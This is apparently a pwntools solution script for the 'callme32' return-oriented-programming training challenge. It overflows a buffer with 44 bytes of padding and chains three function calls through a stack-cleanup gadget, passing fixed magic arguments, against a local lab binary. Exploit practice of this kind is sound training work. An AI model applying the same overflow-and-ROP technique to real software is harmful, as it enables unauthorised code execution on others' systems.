#!/usr/bin/env python3

from pwn import *

target = process('./callme32')

arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)

rop_gadget = p32(0x080487f7) 

one_addr = p32(0x080484f0)
two_addr = p32(0x08048550) 
three_addr = p32(0x080484e0)

payload = b'a'*44
payload += one_addr
payload += rop_gadget
payload += arg1
payload += arg2
payload += arg3

payload += two_addr
payload += rop_gadget
payload += arg1
payload += arg2
payload += arg3

payload += three_addr
payload += rop_gadget
payload += arg1
payload += arg2
payload += arg3

print(payload)

target.recvuntil(">")
target.sendline(payload)
target.interactive()

